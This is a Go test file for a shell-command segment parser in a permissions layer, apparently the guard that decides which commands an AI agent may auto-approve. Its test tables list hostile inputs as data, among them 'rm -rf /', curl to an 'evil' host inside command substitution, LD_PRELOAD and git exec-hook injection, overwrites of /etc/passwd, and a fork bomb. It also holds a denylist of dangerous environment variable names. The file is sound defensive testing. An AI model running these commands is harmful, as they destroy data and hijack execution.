package permissions

import (
	"errors"
	"strings"
	"testing"
)

// seg is a compact expectation for one parsed segment.
type seg struct {
	name string
	args []string
}

func TestSplitSegments(t *testing.T) {
	cases := []struct {
		desc string
		cmd  string
		want []seg
	}{
		{
			desc: "single simple command",
			cmd:  "git status",
			want: []seg{{name: "git", args: []string{"status"}}},
		},
		{
			desc: "compound && splits into two segments",
			cmd:  "git status && rm -rf ~",
			want: []seg{
				{name: "git", args: []string{"status"}},
				{name: "rm", args: []string{"-rf", "~"}},
			},
		},
		{
			desc: "pipe splits into segments",
			cmd:  "cat foo | grep bar",
			want: []seg{
				{name: "cat", args: []string{"foo"}},
				{name: "grep", args: []string{"bar"}},
			},
		},
		{
			desc: "semicolon splits into segments",
			cmd:  "pwd ; ls",
			want: []seg{
				{name: "pwd", args: nil},
				{name: "ls", args: nil},
			},
		},
		{
			desc: "|| splits into segments",
			cmd:  "false || true",
			want: []seg{
				{name: "false", args: nil},
				{name: "true", args: nil},
			},
		},
		{
			desc: "newline splits into two segments",
			cmd:  "pwd\nrm -rf .",
			want: []seg{
				{name: "pwd", args: nil},
				{name: "rm", args: []string{"-rf", "."}},
			},
		},
		{
			desc: "bash -c inner script is enumerated",
			cmd:  `bash -c "ls && rm x"`,
			want: []seg{
				{name: "ls", args: nil},
				{name: "rm", args: []string{"x"}},
			},
		},
		{
			desc: "sh -c inner script is enumerated",
			cmd:  `sh -c 'git status'`,
			want: []seg{
				{name: "git", args: []string{"status"}},
			},
		},
		{
			desc: "word boundary: lsof is not ls",
			cmd:  "lsof -i",
			want: []seg{{name: "lsof", args: []string{"-i"}}},
		},
		{
			// A trailing `# …` comment is stripped by the parser: the
			// commented-out `rm -rf /` is inert, not a smuggled segment.
			desc: "trailing comment is inert, not a smuggled segment",
			cmd:  "ls # rm -rf /",
			want: []seg{{name: "ls", args: nil}},
		},
		{
			// Change 0070 D1: a benign env-var prefix no longer fails closed.
			// The assignment is dropped, and the inner command is the segment.
			desc: "benign env prefix parses to the inner command",
			cmd:  "FOO=1 make",
			want: []seg{{name: "make", args: nil}},
		},
		{
			desc: "multiple benign env prefixes",
			cmd:  "FOO=1 BAR=2 go test",
			want: []seg{{name: "go", args: []string{"test"}}},
		},
		{
			desc: "benign env prefix with an empty value",
			cmd:  "FOO= make",
			want: []seg{{name: "make", args: nil}},
		},
		{
			desc: "benign env prefix with a quoted literal value",
			cmd:  `CGO_ENABLED=0 GOFLAGS="-mod=mod" go build ./...`,
			want: []seg{{name: "go", args: []string{"build", "./..."}}},
		},
		{
			// Assignment-only statement: nothing runs, so nothing to classify.
			desc: "bare assignment produces no segment",
			cmd:  "FOO=1",
			want: nil,
		},
		{
			desc: "bare assignment then a command",
			cmd:  "FOO=1; ls",
			want: []seg{{name: "ls", args: nil}},
		},
		{
			// A name off the denylist parses whatever its case; the denylisted
			// names themselves are matched case-insensitively (FailClosed table).
			desc: "benign lowercase name still parses",
			cmd:  "foo=1 make",
			want: []seg{{name: "make", args: nil}},
		},

		// Change 0070 D2: timeout/env/nohup are peeled to their inner command
		// instead of failing closed as arbitrary-arg wrappers. The peel is
		// dedicated for timeout and env — see the FailClosed table for the
		// shapes that stay shut.
		{
			desc: "timeout with a bare-seconds duration peels to the inner command",
			cmd:  "timeout 30 go test ./...",
			want: []seg{{name: "go", args: []string{"test", "./..."}}},
		},
		{
			desc: "timeout with a fractional suffixed duration",
			cmd:  "timeout 1.5s wc -l x",
			want: []seg{{name: "wc", args: []string{"-l", "x"}}},
		},
		{
			desc: "timeout with -k DUR before the duration",
			cmd:  "timeout -k 5 30 make",
			want: []seg{{name: "make", args: nil}},
		},
		{
			desc: "timeout with a modelled long flag taking a value",
			cmd:  "timeout --kill-after=5s 10m make",
			want: []seg{{name: "make", args: nil}},
		},
		{
			desc: "timeout with --signal=SIG and --preserve-status",
			cmd:  "timeout --preserve-status --signal=KILL 10 go build",
			want: []seg{{name: "go", args: []string{"build"}}},
		},
		{
			desc: "timeout with a combined short flag value",
			cmd:  "timeout -sKILL 10 go build",
			want: []seg{{name: "go", args: []string{"build"}}},
		},
		{
			desc: "timeout then unknown binary is now evaluable, not unparseable",
			cmd:  "timeout 5 somebinary",
			want: []seg{{name: "somebinary", args: nil}},
		},
		{
			desc: "timeout peels into the bash -c script path",
			cmd:  `timeout 30 bash -c "ls && wc -l x"`,
			want: []seg{
				{name: "ls", args: nil},
				{name: "wc", args: []string{"-l", "x"}},
			},
		},
		{
			desc: "env with a benign assignment peels to the inner command",
			cmd:  "env FOO=1 make",
			want: []seg{{name: "make", args: nil}},
		},
		{
			desc: "env with no assignments peels to the inner command",
			cmd:  "env rm x",
			want: []seg{{name: "rm", args: []string{"x"}}},
		},
		{
			// The dangerous command is no longer hidden behind an unparseable
			// wrapper: it reaches the rules layer, which denies it outright.
			desc: "env assignment does not launder the inner command",
			cmd:  "env FOO=bar rm -rf /",
			want: []seg{{name: "rm", args: []string{"-rf", "/"}}},
		},
		{
			// `env` with no remainder prints the environment. Benign, and no
			// command runs, so there is nothing to classify.
			desc: "bare env produces no segment",
			cmd:  "env",
			want: nil,
		},
		{
			desc: "env with only assignments produces no segment",
			cmd:  "env FOO=1 BAR=2",
			want: nil,
		},
		{
			desc: "nohup peels to the inner command",
			cmd:  "nohup go build",
			want: []seg{{name: "go", args: []string{"build"}}},
		},
		{
			desc: "wrappers nest and peel down to the real command",
			cmd:  "nohup env FOO=1 timeout 30 go build ./...",
			want: []seg{{name: "go", args: []string{"build", "./..."}}},
		},

		// Change 0070 D3: control-flow constructs decompose into their
		// constituent simple commands instead of hitting the default:
		// fail-closed arm. Every statement list each node carries is descended,
		// so a dangerous command can never hide inside a branch that the
		// classifier does not look at.
		//
		// INTERIM POSTURE: the bodies below use only literal words. A `$VAR`
		// anywhere — a loop body (`do wc -l $f`), a for-loop header word
		// (`in $LIST`), a case discriminant (`case $x`) — still fails closed
		// here, because literalWord has no opaque-argument concept yet. Those
		// shapes live in the _FailClosed table below and D5 flips them. Writing
		// a `$VAR` row here and bending the parser to pass it would be exactly
		// the fail-open D5 exists to prevent.
		{
			desc: "if/then descends both Cond and Then",
			cmd:  "if [ -f x ]; then cat x; fi",
			want: []seg{
				{name: "[", args: []string{"-f", "x", "]"}},
				{name: "cat", args: []string{"x"}},
			},
		},
		{
			desc: "if/else descends the else branch",
			cmd:  "if true; then ls; else pwd; fi",
			want: []seg{
				{name: "true", args: nil},
				{name: "ls", args: nil},
				{name: "pwd", args: nil},
			},
		},
		{
			// The v3 AST nests each elif/else as another *IfClause hanging off
			// .Else. Stopping at the first level would leave `rm -rf /` in a
			// trailing else invisible to every downstream layer.
			desc: "elif/else chain is followed to the end",
			cmd:  "if true; then ls; elif false; then pwd; else wc -l x; fi",
			want: []seg{
				{name: "true", args: nil},
				{name: "ls", args: nil},
				{name: "false", args: nil},
				{name: "pwd", args: nil},
				{name: "wc", args: []string{"-l", "x"}},
			},
		},
		{
			desc: "for loop with literal header words descends its body",
			cmd:  "for f in a b; do ls; done",
			want: []seg{{name: "ls", args: nil}},
		},
		{
			// `for f; do …` iterates the positional parameters: no header word
			// list at all, so there is nothing unresolvable to fail on.
			desc: "for loop over positional params descends its body",
			cmd:  "for f; do ls; done",
			want: []seg{{name: "ls", args: nil}},
		},
		{
			desc: "nested if inside for",
			cmd:  "for f in a b; do if true; then ls; fi; done",
			want: []seg{
				{name: "true", args: nil},
				{name: "ls", args: nil},
			},
		},
		{
			desc: "while descends Cond and Do",
			cmd:  "while true; do ls; done",
			want: []seg{
				{name: "true", args: nil},
				{name: "ls", args: nil},
			},
		},
		{
			// `until` is a WhileClause with Until: true — same node, same descent.
			desc: "until descends Cond and Do",
			cmd:  "until false; do ls; done",
			want: []seg{
				{name: "false", args: nil},
				{name: "ls", args: nil},
			},
		},
		{
			desc: "case with a literal discriminant descends its branches",
			cmd:  "case foo in a) ls ;; esac",
			want: []seg{{name: "ls", args: nil}},
		},
		{
			desc: "case descends every branch, not just the first",
			cmd:  "case foo in a) ls ;; b) pwd ;; *) wc -l x ;; esac",
			want: []seg{
				{name: "ls", args: nil},
				{name: "pwd", args: nil},
				{name: "wc", args: []string{"-l", "x"}},
			},
		},
		{
			desc: "block descends its statements",
			cmd:  "{ ls; wc -l x; }",
			want: []seg{
				{name: "ls", args: nil},
				{name: "wc", args: []string{"-l", "x"}},
			},
		},
		{
			desc: "subshell descends its statements",
			cmd:  "(cd /tmp && ls)",
			want: []seg{
				{name: "cd", args: []string{"/tmp"}},
				{name: "ls", args: nil},
			},
		},
		{
			// Background-ness changes WHEN a command runs, not WHAT runs, so a
			// backgrounded statement yields the same segments as a foreground one.
			desc: "backgrounded statement yields the same segments",
			cmd:  "ls & wc -l x",
			want: []seg{
				{name: "ls", args: nil},
				{name: "wc", args: []string{"-l", "x"}},
			},
		},
		{
			desc: "backgrounded statement inside a block",
			cmd:  "{ ls & wc -l x; }",
			want: []seg{
				{name: "ls", args: nil},
				{name: "wc", args: []string{"-l", "x"}},
			},
		},
	}

	for _, tc := range cases {
		t.Run(tc.desc, func(t *testing.T) {
			got, err := splitSegments(tc.cmd)
			if err != nil {
				t.Fatalf("splitSegments(%q) unexpected error: %v", tc.cmd, err)
			}
			if len(got) != len(tc.want) {
				t.Fatalf("splitSegments(%q) got %d segments, want %d: %+v", tc.cmd, len(got), len(tc.want), got)
			}
			for i, w := range tc.want {
				if got[i].Name != w.name {
					t.Errorf("segment %d Name = %q, want %q", i, got[i].Name, w.name)
				}
				if !equalArgs(got[i].Args, w.args) {
					t.Errorf("segment %d Args = %#v, want %#v", i, got[i].Args, w.args)
				}
			}
		})
	}
}

func TestSplitSegments_Raw(t *testing.T) {
	got, err := splitSegments("git status && rm -rf ~")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(got) != 2 {
		t.Fatalf("expected 2 segments, got %d", len(got))
	}
	if !strings.Contains(got[0].Raw, "git status") {
		t.Errorf("segment 0 Raw = %q, want to contain %q", got[0].Raw, "git status")
	}
	if !strings.Contains(got[1].Raw, "rm -rf ~") {
		t.Errorf("segment 1 Raw = %q, want to contain %q", got[1].Raw, "rm -rf ~")
	}
}

// TestSplitSegments_BenignRedirects asserts the lenient redirect exception:
// a redirect whose only effect is silencing/redirecting to /dev/null, or a
// pure fd-duplication (2>&1, >&2), must NOT force the whole statement closed.
// The command still parses into its real segments (which higher layers then
// classify), rather than stalling on ErrUnparseable.
func TestSplitSegments_BenignRedirects(t *testing.T) {
	cases := []struct {
		desc string
		cmd  string
		want []seg
	}{
		{
			desc: "2>/dev/null in a read-only pipeline",
			cmd:  "wc -l a.go 2>/dev/null | tail -5",
			want: []seg{
				{name: "wc", args: []string{"-l", "a.go"}},
				{name: "tail", args: []string{"-5"}},
			},
		},
		{
			desc: "stdout to /dev/null",
			cmd:  "ls > /dev/null",
			want: []seg{{name: "ls", args: nil}},
		},
		{
			desc: "append to /dev/null",
			cmd:  "ls >> /dev/null",
			want: []seg{{name: "ls", args: nil}},
		},
		{
			desc: "input from /dev/null",
			cmd:  "cat < /dev/null",
			want: []seg{{name: "cat", args: nil}},
		},
		{
			desc: "2>&1 fd-dup in a pipeline",
			cmd:  "make 2>&1 | tail",
			want: []seg{
				{name: "make", args: nil},
				{name: "tail", args: nil},
			},
		},
		{
			desc: ">&2 fd-dup",
			cmd:  "echo hi >&2",
			want: []seg{{name: "echo", args: []string{"hi"}}},
		},
		{
			desc: "&> /dev/null (stdout+stderr to /dev/null)",
			cmd:  "ls &> /dev/null",
			want: []seg{{name: "ls", args: nil}},
		},
	}

	for _, tc := range cases {
		t.Run(tc.desc, func(t *testing.T) {
			got, err := splitSegments(tc.cmd)
			if err != nil {
				t.Fatalf("splitSegments(%q) unexpected error: %v", tc.cmd, err)
			}
			if len(got) != len(tc.want) {
				t.Fatalf("splitSegments(%q) got %d segments, want %d: %+v", tc.cmd, len(got), len(tc.want), got)
			}
			for i, w := range tc.want {
				if got[i].Name != w.name {
					t.Errorf("segment %d Name = %q, want %q", i, got[i].Name, w.name)
				}
				if !equalArgs(got[i].Args, w.args) {
					t.Errorf("segment %d Args = %#v, want %#v", i, got[i].Args, w.args)
				}
			}
		})
	}
}

func TestSplitSegments_FailClosed(t *testing.T) {
	cases := []struct {
		desc string
		cmd  string
	}{
		{"command substitution $()", `git diff $(curl http://evil)`},
		{"backtick command substitution", "echo `id`"},
		{"comment then substitution", "git status# $(id)"},
		{"process substitution", `diff <(ls) <(ls)`},
		{"env-var assignment prefix with a non-literal arg", "URL=evil curl $URL"},

		// Change 0070 D1: benign env prefixes were widened, but a name that can
		// change what code the inner command loads or runs stays fail-closed,
		// and so does any value we cannot statically resolve.
		{"LD_PRELOAD prefix", "LD_PRELOAD=evil.so make"},
		{"LD_LIBRARY_PATH prefix", "LD_LIBRARY_PATH=/tmp make"},
		{"DYLD_ prefix rule", "DYLD_INSERT_LIBRARIES=evil.dylib make"},
		{"unenumerated LD_ prefix rule", "LD_SOMETHING_NEW=x make"},
		{"unenumerated DYLD_ prefix rule", "DYLD_FRAMEWORK_PATH=/tmp make"},
		{"PATH prefix", "PATH=/tmp make"},
		{"IFS prefix", "IFS=x make"},
		{"BASH_ENV prefix", "BASH_ENV=/tmp/x make"},
		{"ENV prefix", "ENV=/tmp/x sh -c ls"},
		{"SHELL prefix", "SHELL=/tmp/evil make"},
		{"PS4 prefix", "PS4=xtrace make"},
		{"PROMPT_COMMAND prefix", "PROMPT_COMMAND=evil make"},
		{"GIT_SSH_COMMAND prefix", "GIT_SSH_COMMAND=evil git fetch"},
		{"GIT_ASKPASS prefix", "GIT_ASKPASS=/tmp/x git fetch"},
		{"SSH_ASKPASS prefix", "SSH_ASKPASS=/tmp/x git fetch"},
		{"PYTHONSTARTUP prefix", "PYTHONSTARTUP=/tmp/x python"},
		{"NODE_OPTIONS prefix", "NODE_OPTIONS=--require=/tmp/x node app.js"},
		{"PERL5LIB prefix", "PERL5LIB=/tmp perl x.pl"},
		{"RUBYOPT prefix", "RUBYOPT=-rx ruby x.rb"},
		// Regression: git's exec hooks. `git diff`/`git log` ARE auto-approved
		// by isSafeGit, so before the GIT_ prefix rule landed these six were
		// verified to auto-approve an arbitrary exec with no human present —
		// the exact fail-open this change's widening would otherwise create.
		// See TestAutoMode_GitEnvHookPrefix_DoesNotAutoApprove for the
		// end-to-end verdict assertion.
		{"GIT_EXTERNAL_DIFF exec hook", "GIT_EXTERNAL_DIFF=/tmp/evil git diff"},
		{"GIT_PAGER exec hook", "GIT_PAGER=/tmp/evil git log"},
		{"GIT_CONFIG_* injection", "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.pager GIT_CONFIG_VALUE_0=/tmp/evil git log"},
		{"GIT_ prefix rule catches unenumerated names", "GIT_PROXY_COMMAND=/tmp/evil git fetch"},
		{"PAGER exec hook", "PAGER=/tmp/evil git log"},
		{"EDITOR exec hook", "EDITOR=/tmp/evil git log"},
		{"LESSOPEN input filter", "LESSOPEN=/tmp/evil git log"},
		{"BASH_ prefix rule", "BASH_SOMETHING=x make"},
		{"SHELLOPTS prefix", "SHELLOPTS=xtrace make"},
		{"CDPATH prefix", "CDPATH=/tmp make"},
		{"denylist is case-insensitive", "ld_preload=evil.so make"},
		{"denylist prefix rule is case-insensitive", "dyld_insert_libraries=x make"},
		{"command-substitution assignment value", "FOO=$(id) make"},
		{"parameter-expansion assignment value", "FOO=$BAR make"},
		{"assignment value with an embedded expansion", `FOO="pre$BAR" make`},
		{"assignment-only with a dangerous name", "LD_PRELOAD=evil.so"},
		{"assignment-only with a substituted value", "FOO=$(curl http://evil)"},
		{"append assignment", "FOO+=1 make"},
		// The array/subscript inline forms are rejected by the bash parser
		// itself ("inline variables cannot be arrays"), so these rows pin the
		// parse-error path rather than assignsAreBenign's shape check. They stay
		// as regression rows in case a future parser bump starts accepting them.
		{"array assignment", "FOO=(a b) make"},
		{"indexed assignment", "FOO[0]=1 make"},
		{"benign prefix does not launder a wrapper", "FOO=1 sudo rm -rf /"},
		{"benign prefix does not launder a path-qualified argv0", "FOO=1 ./evil"},
		{"path-qualified argv0 relative", "./sed -n 1p file"},
		{"path-qualified argv0 absolute", "/tmp/git status"},
		{"bare bash without -c", "bash"},
		{"bash with script file (no -c)", "bash script.sh"},
		{"sh -c with no script word", "sh -c"},
		{"xargs wrapper", "xargs rm"},
		{"npx wrapper", "npx cowsay hi"},
		{"sudo wrapper", "sudo rm -rf /"},

		// Change 0070 D2: timeout/env/nohup peel (see TestSplitSegments), but
		// every shape where the peel cannot prove what actually runs stays shut.
		// env is deliberately blunt about flags: -i clears the environment and
		// -S re-splits its operand into a whole new command, neither of which
		// the assignment denylist can see.
		{"env -i clears the environment", "env -i make"},
		{"env -u unsets a variable", "env -u PATH make"},
		{"env -S re-splits into a new command", "env -S 'foo bar'"},
		{"env with a long flag", "env --ignore-environment make"},
		{"env -0", "env -0"},
		{"env with a bare -- separator", "env -- make"},
		{"env assignment reuses the D1 denylist", "env LD_PRELOAD=x make"},
		{"env assignment reuses the D1 prefix rule", "env DYLD_INSERT_LIBRARIES=x make"},
		{"env PATH assignment", "env PATH=/tmp make"},
		{"env assignment with a substituted value", "env FOO=$(id) make"},
		{"env assignment with a parameter expansion", "env FOO=$BAR make"},
		{"env assignment with a non-name left side", "env foo-bar=1 make"},
		{"env assignment with an empty name", "env =evil make"},
		{"env does not launder a path-qualified argv0", "env FOO=1 ./evil"},
		{"env does not launder an arbitrary-arg wrapper", "env xargs rm"},
		{"timeout with no duration", "timeout go test"},
		{"timeout with no inner command", "timeout 30"},
		{"bare timeout", "timeout"},
		{"timeout with a non-duration word", "timeout 30x make"},
		{"timeout with an unmodelled flag", "timeout --unmodelled 30 make"},
		{"timeout flag swallows the duration", "timeout -s 30 make"},
		{"timeout -k with no value", "timeout -k"},
		{"timeout with two duration words", "timeout 30 30 make"},
		{"timeout does not launder a wrapper", "timeout 30 sudo rm -rf /"},
		{"timeout does not launder xargs", "timeout 30 xargs rm"},
		{"timeout does not launder a path-qualified argv0", "timeout 30 ./evil"},
		{"path-qualified timeout is not peeled", "/usr/bin/timeout 30 ls"},
		{"nohup does not launder a wrapper", "nohup sudo rm -rf /"},
		{"nohup with no inner command", "nohup"},
		{"redirect to file with >", "echo x > /etc/passwd"},
		{"append redirect >>", "grep foo bar >> ~/.zshrc"},
		{"redirect inside workspace", "ls > out.txt"},
		{"stderr and file redirect", "ls 2>/dev/null > /etc/x"},
		{"dev-null lookalike file", "ls > /dev/null.txt"},
		{"dev-null typo", "ls 2>/dev/nul"},
		{"redirect to variable target", "cat a > $F"},
		{"here-doc", "cat <<EOF\nhi\nEOF"},
		{"input redirect from real file", "cat < config.yaml"},
		{"dup-op to a real file, not an fd", "ls >&file"},
		{"fd-close is not a bare fd number", "ls 2>&-"},
		{"read-write redirect <>", "cat <> scratch"},

		// Change 0070 D3: control flow now descends (see TestSplitSegments), but
		// descent must not become a laundering channel.
		//
		// A FUNCTION DECLARATION IS DELIBERATELY NOT DESCENDED. collectStmt has
		// no *syntax.FuncDecl case and must never grow one: a declaration's body
		// does not run at declaration time, its call sites are invisible to an
		// argv classifier, and it is the recursion vehicle for the fork bomb
		// below. If a future "just add the remaining node types" edit adds the
		// case, this row goes red. That is the point of it.
		{"fork bomb function declaration", ":(){ :|:& };:"},
		{"plain function declaration", "f() { rm -rf /; }"},
		{"function keyword form", "function f { rm -rf /; }"},

		// The per-statement redirect guard runs BEFORE the type switch, so it
		// applies to each descended statement, not just the outermost one.
		{"redirect inside an if branch", "if true; then echo x > /etc/passwd; fi"},
		{"redirect inside a for body", "for f in a b; do echo x > /etc/passwd; done"},
		{"redirect inside a block", "{ echo x > /etc/passwd; }"},
		{"redirect inside a subshell", "(echo x > /etc/passwd)"},
		{"redirect on the compound statement itself", "for f in a b; do ls; done > out.txt"},

		// Descent does not launder a wrapper, a path-qualified argv[0], or a
		// dangerous env prefix — the descended statement faces every check a
		// top-level statement faces.
		{"subshell does not launder a wrapper", "(sudo rm -rf /)"},
		{"block does not launder a wrapper", "{ xargs rm; }"},
		{"if branch does not launder a wrapper", "if true; then sudo rm -rf /; fi"},
		{"else branch does not launder a wrapper", "if true; then ls; else sudo rm -rf /; fi"},
		{"elif chain does not launder a wrapper", "if true; then ls; elif false; then sudo rm -rf /; fi"},
		{"case branch does not launder a wrapper", "case foo in a) sudo rm -rf / ;; esac"},
		{"while body does not launder a wrapper", "while true; do sudo rm -rf /; done"},
		{"for body does not launder a path-qualified argv0", "for f in a b; do ./evil; done"},
		{"block does not launder a dangerous env prefix", "{ LD_PRELOAD=evil.so make; }"},

		// INTERIM POSTURE (D3, pre-D5). A non-literal word is unresolvable, and
		// until D5 gives the parser an opaque-argument representation the honest
		// answer is to fail the whole command closed. Every row below is expected
		// to FLIP to parsing when D5 lands; they are pinned here so the interim
		// behaviour is deliberate rather than accidental.
		{"for header word is a parameter expansion", "for f in $LIST; do ls; done"},
		{"for header word is a command substitution", "for f in $(ls); do ls; done"},
		{"for body arg is a parameter expansion", "for f in a b; do wc -l $f; done"},
		{"case discriminant is a parameter expansion", "case $x in a) ls ;; esac"},
		{"case pattern is a parameter expansion", "case foo in $p) ls ;; esac"},

		// A C-style for header is arithmetic, not a word list. It carries no
		// statement list we could descend and no words we could resolve, so it
		// stays on the fail-closed arm rather than being descended body-only.
		{"c-style for loop", "for ((i=0;i<10;i++)); do ls; done"},

		// Node types with no case are still fail-closed. Listed so that the
		// widening's boundary is visible.
		{"[[ ]] test clause", "[[ -f x ]]"},
		{"arithmetic command", "((1+1))"},
		{"let clause", "let x=1"},
		{"time clause", "time ls"},
	}
	for _, tc := range cases {
		t.Run(tc.desc, func(t *testing.T) {
			_, err := splitSegments(tc.cmd)
			if !errors.Is(err, ErrUnparseable) {
				t.Fatalf("splitSegments(%q) err = %v, want ErrUnparseable", tc.cmd, err)
			}
		})
	}
}

// TestSplitSegments_BenignAssignsAreDropped asserts that a benign env prefix is
// *dropped*, not smuggled into the segment as an argument. If "FOO=1" landed in
// Args, every downstream classifier — path scoping, the read-only safe-list,
// deny-rule matching — would inspect a word that is not an argument at all.
func TestSplitSegments_BenignAssignsAreDropped(t *testing.T) {
	got, err := splitSegments("FOO=1 BAR=2 go test ./...")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(got) != 1 {
		t.Fatalf("expected 1 segment, got %d: %+v", len(got), got)
	}
	if got[0].Name != "go" {
		t.Errorf("Name = %q, want %q", got[0].Name, "go")
	}
	if !equalArgs(got[0].Args, []string{"test", "./..."}) {
		t.Fatalf("Args = %#v, want [test ./...]", got[0].Args)
	}
	for _, a := range got[0].Args {
		if strings.Contains(a, "=") && (strings.HasPrefix(a, "FOO") || strings.HasPrefix(a, "BAR")) {
			t.Errorf("assignment %q leaked into Args: %#v", a, got[0].Args)
		}
	}
}

// TestSplitSegments_EnvPeelDropsAssignments is the D2 mirror of the D1
// assertion above: `env NAME=val cmd` must hand the classifier the inner
// command's own argv, with the assignment words dropped rather than smuggled in
// as arguments.
func TestSplitSegments_EnvPeelDropsAssignments(t *testing.T) {
	got, err := splitSegments("env FOO=1 BAR=2 go test ./...")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(got) != 1 {
		t.Fatalf("expected 1 segment, got %d: %+v", len(got), got)
	}
	if got[0].Name != "go" {
		t.Errorf("Name = %q, want %q", got[0].Name, "go")
	}
	if !equalArgs(got[0].Args, []string{"test", "./..."}) {
		t.Fatalf("Args = %#v, want [test ./...]", got[0].Args)
	}
}

// TestDangerousEnvVarName pins the denylist itself, independent of the parser,
// so change 0070 D2 (env NAME=val peeling) can reuse it with the same coverage.
func TestDangerousEnvVarName(t *testing.T) {
	dangerous := []string{
		"LD_PRELOAD", "LD_LIBRARY_PATH", "LD_AUDIT", "PATH", "IFS", "BASH_ENV",
		"ENV", "SHELL", "PS4", "PROMPT_COMMAND", "GIT_SSH_COMMAND", "GIT_ASKPASS",
		"SSH_ASKPASS", "PYTHONSTARTUP", "NODE_OPTIONS", "PERL5LIB", "RUBYOPT",
		"PAGER", "EDITOR", "VISUAL", "LESSOPEN", "LESSCLOSE", "SHELLOPTS",
		"BASHOPTS", "CDPATH",
		// prefix rules
		"DYLD_INSERT_LIBRARIES", "DYLD_FRAMEWORK_PATH", "LD_ANYTHING_AT_ALL",
		"GIT_EXTERNAL_DIFF", "GIT_PAGER", "GIT_CONFIG_COUNT", "GIT_CONFIG_KEY_0",
		"GIT_PROXY_COMMAND", "GIT_SEQUENCE_EDITOR", "BASH_ENV", "BASH_FUNC_x",
		// case-insensitive
		"ld_preload", "Path", "dyld_insert_libraries", "git_external_diff",
	}
	for _, n := range dangerous {
		if !dangerousEnvVarName(n) {
			t.Errorf("dangerousEnvVarName(%q) = false, want true", n)
		}
	}
	benign := []string{
		"FOO", "BAR", "CGO_ENABLED", "GOFLAGS", "GOOS", "RUST_LOG", "DEBUG",
		"NODE_ENV", "LDFLAGS", "OLDPATH", "MY_PATH", "PATHOLOGICAL",
		// The GIT_/BASH_/LD_ prefix rules must not over-fire on these.
		"GITHUB_TOKEN", "GITOPS", "BASHRC_PATH", "LDAP_URL",
	}
	for _, n := range benign {
		if dangerousEnvVarName(n) {
			t.Errorf("dangerousEnvVarName(%q) = true, want false", n)
		}
	}
}

func TestSplitSegments_ParseError(t *testing.T) {
	_, err := splitSegments("if then fi (")
	if !errors.Is(err, ErrUnparseable) {
		t.Fatalf("expected ErrUnparseable on parse error, got %v", err)
	}
}

func TestSplitSegments_Oversized(t *testing.T) {
	big := "ls " + strings.Repeat("a", maxCommandBytes)
	_, err := splitSegments(big)
	if !errors.Is(err, ErrUnparseable) {
		t.Fatalf("expected ErrUnparseable on oversized input, got %v", err)
	}
}

func equalArgs(a, b []string) bool {
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}
